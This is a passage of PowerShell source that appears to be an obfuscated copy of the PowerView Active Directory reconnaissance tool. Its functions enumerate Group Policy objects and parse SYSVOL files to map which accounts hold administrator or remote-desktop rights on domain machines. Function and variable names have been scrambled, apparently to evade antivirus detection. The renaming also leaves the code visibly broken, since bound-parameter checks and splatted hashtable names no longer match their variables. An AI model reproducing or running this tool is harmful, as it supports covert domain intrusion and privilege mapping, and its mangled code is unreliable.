                                    New-Object -TypeName PSObject -Property @{'Name'="$MVFzdlcPaNvnu99$sTefHRNADQwPSnD";'RemoteServerName'=$cFDvvadWOUxIumb.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[footsteps] bunt error in parsing target : $_"
                            }
                        }
                    }
                    if ($xSLNEIXByfNTAdG) {
                        try { $xSLNEIXByfNTAdG.dispose() }
                        catch {
                            Write-Verbose "[footsteps] Error disposing of the Results object: $_"
                        }
                    }
                    $pj9LyKfSxNWPSfD.dispose()
                }
                catch {
                    Write-Warning "[footsteps] bunt error : $_"
                }
                $vomCtqTwVJKTDHm | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $vomCtqTwVJKTDHm = @()

        if ($PSBoundParameters['Domain']) {
            ForEach ($rT9EZJuWEfY9rVY in $pkMxgDCVHqOym9m) {
                $tHAcROQOWB9HdRG['Domain'] = $rT9EZJuWEfY9rVY
                if ($FKzJmtqtfPzCnjo -match 'all|1') {
                    $vomCtqTwVJKTDHm += cols @SearcherArguments
                }
                if ($FKzJmtqtfPzCnjo -match 'all|2') {
                    $vomCtqTwVJKTDHm += bunt @SearcherArguments
                }
            }
        }
        else {
            if ($FKzJmtqtfPzCnjo -match 'all|1') {
                $vomCtqTwVJKTDHm += cols @SearcherArguments
            }
            if ($FKzJmtqtfPzCnjo -match 'all|2') {
                $vomCtqTwVJKTDHm += bunt @SearcherArguments
            }
        }

        $vomCtqTwVJKTDHm | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}








function intriguing {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $Y9cRKuiJMtuypTR,

        [Switch]
        $hClQbtwDldwuZwv,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $o9foF9sYMiKFGK9 = @{}
    }

    PROCESS {
        try {
            if (($Y9cRKuiJMtuypTR -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $zGe9DQQouBdmhka = "\\$((New-Object System.Uri($Y9cRKuiJMtuypTR)).Host)\SYSVOL"
                if (-not $o9foF9sYMiKFGK9[$zGe9DQQouBdmhka]) {

                    misquote -Path $zGe9DQQouBdmhka -szvFVWkPJummdcf $szvFVWkPJummdcf
                    $o9foF9sYMiKFGK9[$zGe9DQQouBdmhka] = $True
                }
            }

            $ydx9ZTNF9e9lCWJ = $Y9cRKuiJMtuypTR
            if (-not $ydx9ZTNF9e9lCWJ.EndsWith('.inf')) {
                $ydx9ZTNF9e9lCWJ += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            Write-Verbose "[intriguing] Parsing GptTmplPath: $ydx9ZTNF9e9lCWJ"

            if ($PSBoundParameters['OutputObject']) {
                $lTmCHxxdqUQFB9e = shittiest -Path $ydx9ZTNF9e9lCWJ -hClQbtwDldwuZwv -ErrorAction Stop
                if ($lTmCHxxdqUQFB9e) {
                    $lTmCHxxdqUQFB9e | Add-Member Noteproperty 'Path' $ydx9ZTNF9e9lCWJ
                    $lTmCHxxdqUQFB9e
                }
            }
            else {
                $lTmCHxxdqUQFB9e = shittiest -Path $ydx9ZTNF9e9lCWJ -ErrorAction Stop
                if ($lTmCHxxdqUQFB9e) {
                    $lTmCHxxdqUQFB9e['Path'] = $ydx9ZTNF9e9lCWJ
                    $lTmCHxxdqUQFB9e
                }
            }
        }
        catch {
            Write-Verbose "[intriguing] Error parsing $ydx9ZTNF9e9lCWJ : $_"
        }
    }

    END {

        $o9foF9sYMiKFGK9.Keys | ForEach-Object { densities -Path $_ }
    }
}


function adrenals {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $A9tEv9jiVPsMRze,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $o9foF9sYMiKFGK9 = @{}
    }

    PROCESS {
        try {
            if (($A9tEv9jiVPsMRze -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $zGe9DQQouBdmhka = "\\$((New-Object System.Uri($A9tEv9jiVPsMRze)).Host)\SYSVOL"
                if (-not $o9foF9sYMiKFGK9[$zGe9DQQouBdmhka]) {

                    misquote -Path $zGe9DQQouBdmhka -szvFVWkPJummdcf $szvFVWkPJummdcf
                    $o9foF9sYMiKFGK9[$zGe9DQQouBdmhka] = $True
                }
            }

            [XML]$SPOz9KDKGuE9iwM = Get-Content -Path $A9tEv9jiVPsMRze -ErrorAction Stop


            $SPOz9KDKGuE9iwM | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $T9tockrmJu9UTGT = $_.Properties.groupName


                $rw9Og9dlrX9Xq9c = $_.Properties.groupSid
                if (-not $rw9Og9dlrX9Xq9c) {
                    if ($T9tockrmJu9UTGT -match 'Administrators') {
                        $rw9Og9dlrX9Xq9c = 'S-1-5-32-544'
                    }
                    elseif ($T9tockrmJu9UTGT -match 'Remote Desktop') {
                        $rw9Og9dlrX9Xq9c = 'S-1-5-32-555'
                    }
                    elseif ($T9tockrmJu9UTGT -match 'Guests') {
                        $rw9Og9dlrX9Xq9c = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $rw9Og9dlrX9Xq9c = curlew -fT9WVEyXAx9DPM9 $T9tockrmJu9UTGT -szvFVWkPJummdcf $szvFVWkPJummdcf
                        }
                        else {
                            $rw9Og9dlrX9Xq9c = curlew -fT9WVEyXAx9DPM9 $T9tockrmJu9UTGT
                        }
                    }
                }


                $sDYnzWrKftKJNli = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($sDYnzWrKftKJNli) {

                    if ($_.filters) {
                        $XzKnmEz9UFLjssS = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $XzKnmEz9UFLjssS = $Null
                    }

                    if ($sDYnzWrKftKJNli -isnot [System.Array]) { $sDYnzWrKftKJNli = @($sDYnzWrKftKJNli) }

                    $hcqxwBjtFjqRlCX = New-Object PSObject
                    $hcqxwBjtFjqRlCX | Add-Member Noteproperty 'GPOPath' $hhB9xjvGNrfJZ9c
                    $hcqxwBjtFjqRlCX | Add-Member Noteproperty 'Filters' $XzKnmEz9UFLjssS
                    $hcqxwBjtFjqRlCX | Add-Member Noteproperty 'GroupName' $T9tockrmJu9UTGT
                    $hcqxwBjtFjqRlCX | Add-Member Noteproperty 'GroupSID' $rw9Og9dlrX9Xq9c
                    $hcqxwBjtFjqRlCX | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $hcqxwBjtFjqRlCX | Add-Member Noteproperty 'GroupMembers' $sDYnzWrKftKJNli
                    $hcqxwBjtFjqRlCX.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $hcqxwBjtFjqRlCX
                }
            }
        }
        catch {
            Write-Verbose "[adrenals] Error parsing $hhB9xjvGNrfJZ9c : $_"
        }
    }

    END {

        $o9foF9sYMiKFGK9.Keys | ForEach-Object { densities -Path $_ }
    }
}


function shuffling {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $HQaTtXpaNwfS9rI,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $PgzXxHGVDkWW9LL,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $nOZugG9oRAZjCBX = cackles @SearcherArguments
    }

    PROCESS {
        if ($nOZugG9oRAZjCBX) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $9lXFhwbZgtMxbzB = @()
                if ($tHAcROQOWB9HdRG['Properties']) {
                    $BKCcLbrvfbNIi9U = $tHAcROQOWB9HdRG['Properties']
                }
                $tHAcROQOWB9HdRG['Properties'] = 'distinguishedname,dnshostname'
                $ZThBVMgda9VhrfH = $Null

                if ($PSBoundParameters['ComputerIdentity']) {
                    $tHAcROQOWB9HdRG['Identity'] = $HQaTtXpaNwfS9rI
                    $wlkrajnezbzvml9 = eigenvalues @SearcherArguments -Fdx99xLobbqBPcQ | Select-Object -First 1
                    if(-not $wlkrajnezbzvml9) {
                        Write-Verbose "[shuffling] Computer '$HQaTtXpaNwfS9rI' not found!"
                    }
                    $Lt9fBFA9A9LHslT = $wlkrajnezbzvml9.distinguishedname
                    $ZThBVMgda9VhrfH = $wlkrajnezbzvml9.dnshostname
                }
                else {
                    $tHAcROQOWB9HdRG['Identity'] = $PgzXxHGVDkWW9LL
                    $User = noshes @SearcherArguments -Fdx99xLobbqBPcQ | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[shuffling] User '$PgzXxHGVDkWW9LL' not found!"
                    }
                    $Lt9fBFA9A9LHslT = $User.distinguishedname
                }


                $jDaDZlJp9oFyCXS = @()
                $jDaDZlJp9oFyCXS += $Lt9fBFA9A9LHslT.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $Lt9fBFA9A9LHslT.SubString($Lt9fBFA9A9LHslT.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[shuffling] object OUs: $jDaDZlJp9oFyCXS"

                if ($jDaDZlJp9oFyCXS) {

                    $tHAcROQOWB9HdRG.Remove('Properties')
                    $QwDlf9IBmAmaNLz = $False
                    ForEach($IoyiREOymCXpDnD in $jDaDZlJp9oFyCXS) {
                        $tHAcROQOWB9HdRG['Identity'] = $IoyiREOymCXpDnD
                        $9lXFhwbZgtMxbzB += Noelle @SearcherArguments | ForEach-Object {

                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $ZdALZGjYx9VIOzc = $Parts[1]

                                        if ($QwDlf9IBmAmaNLz) {


                                            if ($ZdALZGjYx9VIOzc -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {

                                            $GpoDN
                                        }
                                    }
                                }
                            }


                            if ($_.gpoptions -eq 1) {
                                $QwDlf9IBmAmaNLz = $True
                            }
                        }
                    }
                }

                if ($ZThBVMgda9VhrfH) {

                    $TI9qcSwGfGkjbX9 = (fillers -cNTDaoDBIWkDu9I $ZThBVMgda9VhrfH).SiteName
                    if($TI9qcSwGfGkjbX9 -and ($TI9qcSwGfGkjbX9 -notlike 'Error*')) {
                        $tHAcROQOWB9HdRG['Identity'] = $TI9qcSwGfGkjbX9
                        $9lXFhwbZgtMxbzB += fourteenths @SearcherArguments | ForEach-Object {
                            if($_.gplink) {

                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }


                $TdpnqM9nzBDHCL9 = $Lt9fBFA9A9LHslT.SubString($Lt9fBFA9A9LHslT.IndexOf('DC='))
                $tHAcROQOWB9HdRG.Remove('Identity')
                $tHAcROQOWB9HdRG.Remove('Properties')
                $tHAcROQOWB9HdRG['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$TdpnqM9nzBDHCL9)"
                $9lXFhwbZgtMxbzB += ensnared @SearcherArguments | ForEach-Object {
                    if($_.gplink) {

                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[shuffling] GPOAdsPaths: $9lXFhwbZgtMxbzB"


                if ($BKCcLbrvfbNIi9U) { $tHAcROQOWB9HdRG['Properties'] = $BKCcLbrvfbNIi9U }
                else { $tHAcROQOWB9HdRG.Remove('Properties') }
                $tHAcROQOWB9HdRG.Remove('Identity')

                $9lXFhwbZgtMxbzB | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {

                    $tHAcROQOWB9HdRG['SearchBase'] = $_
                    $tHAcROQOWB9HdRG['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    ensnared @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $9pNjjurFRb9jpSJ = ''
                $9QyouHvxMZKCIKN = ''
                $MhNmgElNMTxhWpJ | Where-Object {$_} | ForEach-Object {
                    $isYmprKvwrxUsJW = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($isYmprKvwrxUsJW -match 'LDAP://|^CN=.*') {
                        $9pNjjurFRb9jpSJ += "(distinguishedname=$isYmprKvwrxUsJW)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {


                            $bbGfPzUehrfQybT = $isYmprKvwrxUsJW.SubString($isYmprKvwrxUsJW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[shuffling] Extracted domain '$bbGfPzUehrfQybT' from '$isYmprKvwrxUsJW'"
                            $tHAcROQOWB9HdRG['Domain'] = $bbGfPzUehrfQybT
                            $nOZugG9oRAZjCBX = cackles @SearcherArguments
                            if (-not $nOZugG9oRAZjCBX) {
                                Write-Warning "[shuffling] Unable to retrieve domain searcher for '$bbGfPzUehrfQybT'"
                            }
                        }
                    }
                    elseif ($isYmprKvwrxUsJW -match '{.*}') {
                        $9pNjjurFRb9jpSJ += "(name=$isYmprKvwrxUsJW)"
                    }
                    else {
                        try {
                            $bgaRJRRuWyecMST = (-Join (([Guid]$isYmprKvwrxUsJW).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $9pNjjurFRb9jpSJ += "(objectguid=$bgaRJRRuWyecMST)"
                        }
                        catch {
                            $9pNjjurFRb9jpSJ += "(displayname=$isYmprKvwrxUsJW)"
                        }
                    }
                }
                if ($9pNjjurFRb9jpSJ -and ($9pNjjurFRb9jpSJ.Trim() -ne '') ) {
                    $9QyouHvxMZKCIKN += "(|$9pNjjurFRb9jpSJ)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[shuffling] Using additional LDAP filter: $RmrzVOkRggEzAyC"
                    $9QyouHvxMZKCIKN += "$RmrzVOkRggEzAyC"
                }

                $nOZugG9oRAZjCBX.filter = "(&(objectCategory=groupPolicyContainer)$9QyouHvxMZKCIKN)"
                Write-Verbose "[shuffling] filter string: $($nOZugG9oRAZjCBX.filter)"

                if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $nOZugG9oRAZjCBX.FindOne() }
                else { $xSLNEIXByfNTAdG = $nOZugG9oRAZjCBX.FindAll() }
                $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {

                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($KZiNDyuCPTYnSy9 -Match '^GC://')) {
                            $GPO = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $9nOTbnsBVGBFhCt = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $9RTZrEbuwiBvKH9 = "\\$9nOTbnsBVGBFhCt\SysVol\$9nOTbnsBVGBFhCt\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $9RTZrEbuwiBvKH9
                            }
                            catch {
                                Write-Verbose "[shuffling] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($xSLNEIXByfNTAdG) {
                    try { $xSLNEIXByfNTAdG.dispose() }
                    catch {
                        Write-Verbose "[shuffling] Error disposing of the Results object: $_"
                    }
                }
                $nOZugG9oRAZjCBX.dispose()
            }
        }
    }
}


function bang {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [Switch]
        $dqvnJU9M99MozLE,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['LDAPFilter']) { $tHAcROQOWB9HdRG['LDAPFilter'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }

        $An9cEA9BZazncEs = @{}
        if ($PSBoundParameters['Domain']) { $An9cEA9BZazncEs['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Server']) { $An9cEA9BZazncEs['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['Credential']) { $An9cEA9BZazncEs['Credential'] = $szvFVWkPJummdcf }

        $L9hyuo9JiyCLPCF = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $tHAcROQOWB9HdRG['Identity'] = $MhNmgElNMTxhWpJ }

        shuffling @SearcherArguments | ForEach-Object {
            $tC9cxFQYTO9LLvn = $_.displayname
            $u9d9WHZXI9wtSod = $_.name
            $FNDXVkjOEPWLvbC = $_.gpcfilesyspath

            $BSYjipWlXb9kvq9 =  @{ 'GptTmplPath' = "$FNDXVkjOEPWLvbC\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $BSYjipWlXb9kvq9['Credential'] = $szvFVWkPJummdcf }


            $Inf = intriguing @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $ZvuqWTVZutapYHf = @{}


                ForEach ($AoxwWtGRyhVaOPP in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $tQtTIslLUyNaLO9 = $AoxwWtGRyhVaOPP.Key.Split('__', $L9hyuo9JiyCLPCF) | ForEach-Object {$_.Trim()}

                    $DKiM9QjcvzEzHZw = $AoxwWtGRyhVaOPP.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters['ResolveMembersToSIDs']) {

                        $oiBkyyxLEjNfT9n = @()
                        ForEach ($9mLdlSJRwrOuSuV in $DKiM9QjcvzEzHZw) {
                            if ($9mLdlSJRwrOuSuV -and ($9mLdlSJRwrOuSuV.Trim() -ne '')) {
                                if ($9mLdlSJRwrOuSuV -notmatch '^S-1-.*') {
                                    $Dqs9xPiXR9nh99S = @{'ObjectName' = $9mLdlSJRwrOuSuV}
                                    if ($PSBoundParameters['Domain']) { $Dqs9xPiXR9nh99S['Domain'] = $pkMxgDCVHqOym9m }
                                    $QhiubkSzPR9qSpE = curlew @ConvertToArguments

                                    if ($QhiubkSzPR9qSpE) {
                                        $oiBkyyxLEjNfT9n += $QhiubkSzPR9qSpE
                                    }
                                    else {
                                        $oiBkyyxLEjNfT9n += $9mLdlSJRwrOuSuV
                                    }
                                }
                                else {
                                    $oiBkyyxLEjNfT9n += $9mLdlSJRwrOuSuV
                                }
                            }
                        }
                        $DKiM9QjcvzEzHZw = $oiBkyyxLEjNfT9n
                    }

                    if (-not $ZvuqWTVZutapYHf[$Group]) {
                        $ZvuqWTVZutapYHf[$Group] = @{}
                    }
                    if ($DKiM9QjcvzEzHZw -isnot [System.Array]) {$DKiM9QjcvzEzHZw = @($DKiM9QjcvzEzHZw)}
                    $ZvuqWTVZutapYHf[$Group].Add($tQtTIslLUyNaLO9, $DKiM9QjcvzEzHZw)
                }

                ForEach ($AoxwWtGRyhVaOPP in $ZvuqWTVZutapYHf.GetEnumerator()) {
                    if ($AoxwWtGRyhVaOPP -and $AoxwWtGRyhVaOPP.Key -and ($AoxwWtGRyhVaOPP.Key -match '^\*')) {

                        $rw9Og9dlrX9Xq9c = $AoxwWtGRyhVaOPP.Key.Trim('*')
                        if ($rw9Og9dlrX9Xq9c -and ($rw9Og9dlrX9Xq9c.Trim() -ne '')) {
                            $T9tockrmJu9UTGT = congesting -ObjectSID $rw9Og9dlrX9Xq9c @ConvertArguments
                        }
                        else {
                            $T9tockrmJu9UTGT = $False
                        }
                    }
                    else {
                        $T9tockrmJu9UTGT = $AoxwWtGRyhVaOPP.Key

                        if ($T9tockrmJu9UTGT -and ($T9tockrmJu9UTGT.Trim() -ne '')) {
                            if ($T9tockrmJu9UTGT -match 'Administrators') {
                                $rw9Og9dlrX9Xq9c = 'S-1-5-32-544'
                            }
                            elseif ($T9tockrmJu9UTGT -match 'Remote Desktop') {
                                $rw9Og9dlrX9Xq9c = 'S-1-5-32-555'
                            }
                            elseif ($T9tockrmJu9UTGT -match 'Guests') {
                                $rw9Og9dlrX9Xq9c = 'S-1-5-32-546'
                            }
                            elseif ($T9tockrmJu9UTGT.Trim() -ne '') {
                                $Dqs9xPiXR9nh99S = @{'ObjectName' = $T9tockrmJu9UTGT}
                                if ($PSBoundParameters['Domain']) { $Dqs9xPiXR9nh99S['Domain'] = $pkMxgDCVHqOym9m }
                                $rw9Og9dlrX9Xq9c = curlew @ConvertToArguments
                            }
                            else {
                                $rw9Og9dlrX9Xq9c = $Null
                            }
                        }
                    }

                    $DZpFNwY9CVwYuLd = New-Object PSObject
                    $DZpFNwY9CVwYuLd | Add-Member Noteproperty 'GPODisplayName' $tC9cxFQYTO9LLvn
                    $DZpFNwY9CVwYuLd | Add-Member Noteproperty 'GPOName' $u9d9WHZXI9wtSod
                    $DZpFNwY9CVwYuLd | Add-Member Noteproperty 'GPOPath' $FNDXVkjOEPWLvbC
                    $DZpFNwY9CVwYuLd | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $DZpFNwY9CVwYuLd | Add-Member Noteproperty 'Filters' $Null
                    $DZpFNwY9CVwYuLd | Add-Member Noteproperty 'GroupName' $T9tockrmJu9UTGT
                    $DZpFNwY9CVwYuLd | Add-Member Noteproperty 'GroupSID' $rw9Og9dlrX9Xq9c
                    $DZpFNwY9CVwYuLd | Add-Member Noteproperty 'GroupMemberOf' $AoxwWtGRyhVaOPP.Value.Memberof
                    $DZpFNwY9CVwYuLd | Add-Member Noteproperty 'GroupMembers' $AoxwWtGRyhVaOPP.Value.Members
                    $DZpFNwY9CVwYuLd.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $DZpFNwY9CVwYuLd
                }
            }


            $BSYjipWlXb9kvq9 =  @{
                'GroupsXMLpath' = "$FNDXVkjOEPWLvbC\MACHINE\Preferences\Groups\Groups.xml"
            }

            adrenals @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $oiBkyyxLEjNfT9n = @()
                    ForEach ($9mLdlSJRwrOuSuV in $_.GroupMembers) {
                        if ($9mLdlSJRwrOuSuV -and ($9mLdlSJRwrOuSuV.Trim() -ne '')) {
                            if ($9mLdlSJRwrOuSuV -notmatch '^S-1-.*') {


                                $Dqs9xPiXR9nh99S = @{'ObjectName' = $T9tockrmJu9UTGT}
                                if ($PSBoundParameters['Domain']) { $Dqs9xPiXR9nh99S['Domain'] = $pkMxgDCVHqOym9m }
                                $QhiubkSzPR9qSpE = curlew -pkMxgDCVHqOym9m $pkMxgDCVHqOym9m -fT9WVEyXAx9DPM9 $9mLdlSJRwrOuSuV

                                if ($QhiubkSzPR9qSpE) {
                                    $oiBkyyxLEjNfT9n += $QhiubkSzPR9qSpE
                                }
                                else {
                                    $oiBkyyxLEjNfT9n += $9mLdlSJRwrOuSuV
                                }
                            }
                            else {
                                $oiBkyyxLEjNfT9n += $9mLdlSJRwrOuSuV
                            }
                        }
                    }
                    $_.GroupMembers = $oiBkyyxLEjNfT9n
                }

                $_ | Add-Member Noteproperty 'GPODisplayName' $tC9cxFQYTO9LLvn
                $_ | Add-Member Noteproperty 'GPOName' $u9d9WHZXI9wtSod
